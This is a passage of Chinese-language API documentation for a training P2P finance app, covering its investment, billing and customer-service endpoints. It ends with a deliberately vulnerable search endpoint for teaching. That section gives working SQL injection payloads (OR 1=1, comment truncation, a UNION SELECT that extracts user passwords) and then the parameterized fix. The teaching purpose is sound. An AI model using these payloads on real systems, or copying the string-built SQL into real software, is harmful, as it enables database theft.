        "amount": "10000.00",
        "expected_return": "850.00",
        "actual_return": null,
        "status": "earning",
        "invest_time": "2023-12-01T10:00:00Z",
        "confirm_time": "2023-12-01T10:05:00Z",
        "value_date": "2024-01-01",
        "maturity_date": "2025-01-01",
        "annual_rate": "8.50",
        "duration_months": 12,
        "product_status": "RECRUITING"
    }
}
```

---

## 12. 投资统计API

### 12.1 获取投资统计

**接口地址**: `/investments/api/statistics/`  
**请求方法**: GET  
**是否需要认证**: 是

**成功响应（200）**:
```json
{
    "status": 0,
    "data": {
        "total_count": 10,
        "total_amount": "100000.00",
        "total_expected_return": "8500.00",
        "total_actual_return": "2500.00",
        "confirmed_count": 2,
        "earning_count": 6,
        "completed_count": 2,
        "current_balance": "50000.00",
        "total_investment": "100000.00",
        "total_earnings": "2500.00"
    }
}
```

---

## 13. 账单管理API

### 13.1 获取账单列表

**接口地址**: `/user/bills/` (Web页面接口，非RESTful API)  
**请求方法**: GET  
**是否需要认证**: 是

**查询参数（可选）**:
| 参数名 | 类型 | 说明 |
|--------|------|------|
| type | string | 账单类型 (all/income/expense) |
| category | string | 分类 |
| status | string | 状态 |
| date_range | string | 日期范围 (7/30/90/all) |
| page | integer | 页码 |

**账单分类说明**:
- **收入类型**:
  - `investment_income`: 投资收益
  - `interest_income`: 利息收入
  - `principal_return`: 本金回收
  - `transfer_in`: 转入
  - `recharge`: 充值
  - `other_income`: 其他收入

- **支出类型**:
  - `investment`: 投资支出
  - `loan_repayment`: 借款还款
  - `service_fee`: 服务费
  - `transfer_out`: 转出
  - `withdrawal`: 提现
  - `other_expense`: 其他支出

**状态说明**:
- `pending`: 处理中
- `completed`: 已完成
- `failed`: 失败
- `cancelled`: 已取消

**功能说明**:
此接口为Web页面接口，返回HTML页面而非JSON数据。账单功能包括：
- 收支统计（总收入、总支出、净收支、待处理数量）
- 账单列表（支持多维度筛选）
- 月度收支趋势图表
- 分类统计
- 分页显示

**访问示例**:
```
GET /user/bills/?type=income&date_range=30
GET /user/bills/?category=investment_income&status=completed
```

**注意事项**:
- 账单记录通过 `BillRecord` 模型管理
- 可使用管理命令生成测试数据：`python manage.py generate_bills --username=用户名`
- 账单自动关联投资和收益记录
- 每笔交易会记录交易后余额

---

## 安全测试建议

### 1. 认证绕过测试
- 尝试在未登录状态访问需要认证的接口
- 测试Session劫持和Cookie篡改

### 2. 参数验证测试
- SQL注入：在username、email等字段注入SQL语句
- XSS攻击：在用户输入字段注入脚本
- 越权访问：尝试访问其他用户的资源

### 3. 业务逻辑测试
- 金额负数测试：尝试输入负数金额
- 并发测试：同时提交多个投资请求
- 状态篡改：尝试直接修改订单状态

### 4. 敏感信息泄露
- 检查错误消息是否泄露敏感信息
- 测试用户枚举攻击

---

## 14. 客服系统API

### 14.1 获取用户会话列表

**接口地址**: `/customer-service/api/sessions/`  
**请求方法**: GET  
**是否需要认证**: 是

**成功响应（200）**:
```json
{
    "sessions": [
        {
            "id": 1,
            "status": "active",
            "created_at": "2025-12-25T10:00:00+08:00",
            "last_message": "您好，请问有什么可以帮到您？",
            "last_message_at": "2025-12-25T10:05:00+08:00"
        }
    ]
}
```

---

### 14.2 关闭会话

**接口地址**: `/customer-service/api/sessions/<session_id>/close/`  
**请求方法**: POST  
**是否需要认证**: 是（用户只能关闭自己的会话，客服可关闭任意会话）

**成功响应（200）**:
```json
{
    "success": true,
    "message": "会话已关闭"
}
```

---

### 14.3 获取待处理会话（客服专用）

**接口地址**: `/customer-service/api/pending/`  
**请求方法**: GET  
**是否需要认证**: 是（需要is_staff权限）

**成功响应（200）**:
```json
{
    "sessions": [
        {
            "id": 1,
            "user_id": 5,
            "username": "testuser",
            "status": "pending",
            "created_at": "2025-12-25T10:00:00+08:00",
            "last_message": "您好，我想咨询一下借款问题",
            "last_message_at": "2025-12-25T10:01:00+08:00",
            "agent": null
        }
    ]
}
```

---

### 14.4 分配会话（客服专用）

**接口地址**: `/customer-service/api/sessions/<session_id>/assign/`  
**请求方法**: POST  
**是否需要认证**: 是（需要is_staff权限）

**成功响应（200）**:
```json
{
    "success": true,
    "message": "会话已分配"
}
```

---

## 15. 客服WebSocket接口

### 15.1 连接地址

**WebSocket URL**: `ws://<服务器地址>/ws/customer-service/<session_id>/`

**示例**: `ws://192.168.233.129/ws/customer-service/1/`

**连接要求**:
- 必须已登录（携带有效的Session Cookie）
- session_id必须是有效的客服会话ID

---

### 15.2 连接成功响应

连接成功后，服务器会发送：

```json
{
    "type": "connection",
    "message": "已连接到客服系统",
    "session_id": 1,
    "session_status": "active",
    "user_id": 5,
    "username": "testuser"
}
```

**session_status可能的值**:
- `pending` - 待处理
- `active` - 进行中
- `closed` - 已关闭

---

### 15.3 发送消息

**客户端发送格式**:
```json
{
    "type": "message",
    "message": "您好，我想咨询借款问题",
    "role": "user"
}
```

**参数说明**:
| 参数名 | 类型 | 必填 | 说明 |
|--------|------|------|------|
| type | string | 是 | 固定为 "message" |
| message | string | 是 | 消息内容 |
| role | string | 是 | 发送者角色："user"(用户) 或 "agent"(客服) |

---

### 15.4 接收消息

**服务器推送的消息格式**:
```json
{
    "type": "message",
    "message": "您好，很高兴为您服务！",
    "sender_id": 2,
    "sender_name": "customer_service",
    "sender_type": "agent",
    "timestamp": "2025-12-25T10:05:30.123456+08:00"
}
```

**字段说明**:
| 字段名 | 类型 | 说明 |
|--------|------|------|
| type | string | 消息类型，固定为 "message" |
| message | string | 消息内容 |
| sender_id | int | 发送者用户ID |
| sender_name | string | 发送者用户名 |
| sender_type | string | 发送者角色："user" 或 "agent" |
| timestamp | string | ISO 8601格式时间戳 |

---

### 15.5 输入状态

**发送正在输入状态**:
```json
{
    "type": "typing",
    "is_typing": true
}
```

**接收输入状态通知**:
```json
{
    "type": "typing",
    "sender_name": "customer_service",
    "is_typing": true
}
```

---

### 15.6 会话关闭通知

当会话被关闭时（用户或客服关闭），服务器推送：

```json
{
    "type": "session_closed",
    "message": "会话已结束",
    "closed_by": "agent"
}
```

**closed_by可能的值**:
- `user` - 用户关闭
- `agent` - 客服关闭

---

### 15.7 错误处理

**向已关闭的会话发送消息时**:
```json
{
    "type": "session_closed",
    "message": "会话已结束，请点击客服按钮开始新的咨询"
}
```

---

### 15.8 完整测试流程

#### 步骤1：登录获取Session
```bash
curl -X POST http://192.168.233.129/auth/api/login/ \
  -H "Content-Type: application/json" \
  -d '{"username": "testuser", "password": "Test123456"}' \
  -c cookies.txt
```

#### 步骤2：创建客服会话（通过访问客服页面）
```bash
curl -X GET http://192.168.233.129/customer-service/ \
  -b cookies.txt -c cookies.txt
```

#### 步骤3：使用WebSocket工具连接

**使用wscat测试**:
```bash
# 安装wscat
npm install -g wscat

# 连接（需要在浏览器中先登录获取cookie）
wscat -c "ws://192.168.233.129/ws/customer-service/1/" \
  --header "Cookie: sessionid=<your_session_id>"
```

**使用Postman测试**:
1. 新建WebSocket Request
2. 输入URL: `ws://192.168.233.129/ws/customer-service/1/`
3. 在Headers中添加: `Cookie: sessionid=<your_session_id>`
4. 点击Connect
5. 发送消息: `{"type": "message", "message": "你好", "role": "user"}`

**使用浏览器控制台测试**:
```javascript
// 在已登录的页面中执行
const ws = new WebSocket('ws://192.168.233.129/ws/customer-service/1/');

ws.onopen = function() {
    console.log('连接成功');
};

ws.onmessage = function(e) {
    console.log('收到消息:', JSON.parse(e.data));
};

ws.onerror = function(e) {
    console.error('WebSocket错误:', e);
};

// 发送消息
ws.send(JSON.stringify({
    type: 'message',
    message: '你好，我想咨询一下',
    role: 'user'
}));
```

---

## 附录

### API路由映射表

| 功能模块 | URL前缀 | 说明 |
|---------|---------|------|
| 认证系统 | `/auth/` | 登录、注册、用户信息 |
| 认证API | `/auth/api/` | RESTful API接口 |
| 借款系统 | `/borrow/` | 借款页面 |
| 借款API | `/borrow/api/` | RESTful API接口 |
| 投资系统 | `/investments/` | 投资页面 |
| 投资API | `/investments/api/` | RESTful API接口 |
| 用户中心 | `/user/` | 个人中心、账单等 |
| 产品中心 | `/products/` | P2P产品列表 |
| 智能投顾 | `/roboadvisor/` | AI投资建议 |
| 财富计划 | `/wealth-plan/` | 理财计划 |
| 社区 | `/community/` | 投资者交流 |
| 新闻 | `/news/` | 平台头条 |
| 客服系统 | `/customer-service/` | 在线客服页面 |
| 客服API | `/customer-service/api/` | RESTful API接口 |
| 客服WebSocket | `ws://*/ws/customer-service/<id>/` | 实时通信 |
| 管理后台 | `/admin-panel/` | 管理员界面 |

### HTTP状态码说明
- `200 OK`: 请求成功
- `201 Created`: 资源创建成功
- `400 Bad Request`: 请求参数错误
- `401 Unauthorized`: 未认证
- `403 Forbidden`: 无权限
- `404 Not Found`: 资源不存在
- `500 Internal Server Error`: 服务器错误

### 常见错误排查

#### 1. CSRF验证失败
**原因**: 所有API接口已移除CSRF验证，不应该出现此错误。如果出现，检查是否访问了错误的URL（网页接口而非API接口）。

**解决**: 确保使用 `/api/` 路径的接口。

#### 2. PhoneNumber序列化错误
**原因**: 已修复，所有phone字段已转换为字符串。

**解决**: 如果仍然出现，检查代码是否使用了 `str(user.phone)`。

#### 3. Session未保持
**原因**: Postman默认会自动管理Cookie。

**解决**: 
- 确保在Postman设置中启用了Cookie管理
- 登录后的请求会自动带上Session Cookie

#### 4. H5移动端访问
**支持**: 项目已完整支持H5移动端访问。

**使用方法**:
1. 手机浏览器访问: `http://192.168.254.130:8000/`
2. 页面会自动适配手机屏幕
3. 支持添加到主屏幕功能
4. 响应式断点: 992px（平板横屏）、768px（平板竖屏）、576px（手机）

---

## 更新日志

**v2.2 (2025-12-25)**
- ✅ 新增：客服系统API接口
- ✅ 新增：客服WebSocket实时通信接口
- ✅ 支持：实时消息推送
- ✅ 支持：输入状态提示
- ✅ 支持：会话关闭通知

**v2.1 (2025-01-06)**
- ✅ 新增：账单管理功能（Web页面）
- ✅ 新增：账单数据模型 BillRecord
- ✅ 新增：账单生成管理命令
- ✅ 优化：响应式布局，支持H5移动端
- ✅ 修复：所有API接口路径验证

**v2.0 (2023-12-01)**
- ✅ 新增：完整的借款API（产品、申请、还款）
- ✅ 新增：完整的投资API（产品、投资、统计）
- ✅ 新增：用户资料管理API
- ✅ 新增：银行卡管理API
- ✅ 新增：实名认证API
- ✅ 修复：所有PhoneNumber字段序列化问题
- ✅ 优化：统一的错误处理和响应格式

**v1.0 (2023-11-30)**
- 初始版本：基础认证API

---

## 16. 安全测试演示API

> ⚠️ **警告**：以下接口**故意包含安全漏洞**，仅用于安全测试教学演示，严禁用于生产环境！

### 16.1 SQL注入漏洞演示

**接口地址**: `/auth/api/vulnerable/search/`  
**请求方法**: GET / POST  
**Content-Type**: `application/json` 或 `application/x-www-form-urlencoded`  
**是否需要认证**: 否

**漏洞说明**:
此接口使用不安全的SQL字符串拼接，未对用户输入进行过滤和参数化处理，存在SQL注入漏洞。

**请求参数**:
| 参数名 | 类型 | 必填 | 说明 |
|--------|------|------|------|
| keyword | string | 是 | 搜索关键词（用户名） |

**正常请求示例**:
```bash
# GET请求
curl "http://127.0.0.1/auth/api/vulnerable/search/?keyword=admin"

# POST请求（JSON）
curl -X POST "http://127.0.0.1/auth/api/vulnerable/search/" \
  -H "Content-Type: application/json" \
  -d '{"keyword": "admin"}'
```

**正常响应（200）**:
```json
{
    "status": 0,
    "message": "找到 1 条结果",
    "sql_executed": "SELECT id, username, email, phone FROM accounts_user WHERE username LIKE '%admin%'",
    "data": [
        {
            "id": 1,
            "username": "admin",
            "email": "admin@wefinance.com",
            "phone": "13700137000"
        }
    ],
    "warning": "⚠️ 此接口仅用于安全测试教学"
}
```

---

### 16.2 SQL注入攻击演示

**攻击Payload示例**:

#### 1. 绕过条件获取所有用户
```bash
# 使用 OR 1=1 绕过WHERE条件
curl -G "http://127.0.0.1/auth/api/vulnerable/search/" \
  --data-urlencode "keyword=' OR '1'='1"
```

**攻击结果**:
```json
{
    "status": 0,
    "message": "找到 8 条结果",
    "sql_executed": "SELECT id, username, email, phone FROM accounts_user WHERE username LIKE '%' OR '1'='1%'",
    "data": [
        {"id": 1, "username": "admin", ...},
        {"id": 4, "username": "jas", ...},
        // ... 返回所有用户数据
    ]
}
```

#### 2. 使用注释截断
```bash
curl -G "http://127.0.0.1/auth/api/vulnerable/search/" \
  --data-urlencode "keyword=' OR 1=1 --"
```

#### 3. UNION注入获取敏感信息
```bash
curl -G "http://127.0.0.1/auth/api/vulnerable/search/" \
  --data-urlencode "keyword=' UNION SELECT id,username,email,password FROM accounts_user --"
```

#### 4. 基于错误的注入
```bash
curl -G "http://127.0.0.1/auth/api/vulnerable/search/" \
  --data-urlencode "keyword='"
```

**错误响应（500）**:
```json
{
    "status": 500,
    "message": "SQL执行错误: near \"%\": syntax error",
    "hint": "这可能是SQL注入导致的语法错误"
}
```

---

### 16.3 安全修复建议

**漏洞代码（不安全）**:
```python
# ❌ 不安全：直接拼接用户输入
sql = f"SELECT * FROM users WHERE username LIKE '%{keyword}%'"
cursor.execute(sql)
```

**修复方案（安全）**:
```python
# ✅ 安全：使用参数化查询
from django.db import connection

with connection.cursor() as cursor:
    cursor.execute(
        "SELECT * FROM users WHERE username LIKE %s",
        [f'%{keyword}%']
    )

# ✅ 更推荐：使用Django ORM
from accounts.models import User
users = User.objects.filter(username__icontains=keyword)
```

---

## 联系方式

如有问题，请联系：
- 项目负责人：WeFinance团队
- 用途：安全测试教学演示
